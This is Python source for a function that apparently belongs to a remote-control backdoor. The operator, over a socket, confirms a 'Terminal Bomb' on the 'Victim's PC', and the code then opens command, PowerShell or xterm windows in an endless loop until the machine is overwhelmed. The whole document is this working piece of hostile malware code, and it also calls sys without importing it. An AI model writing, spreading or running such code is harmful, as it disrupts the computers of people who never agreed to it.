#!/bin/env python3
import os
import platform

def termBomb(con):
    con.sendall(b"\nTerminal Bomb Victim's PC? (yes/no): ")
    duar = con.recv(2048)
    try:
        duar = str(duar.decode().strip())
        if duar == "yes":
            if platform.system() == "Windows": 
                while True:
                    os.system("start cmd /k")
                    os.system("cmd /C start powershell")
            elif platform.system() == "Linux":
                while True:
                    os.system("xterm &")
        else:
            con.sendall(b'\nOperation Cancelled')
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')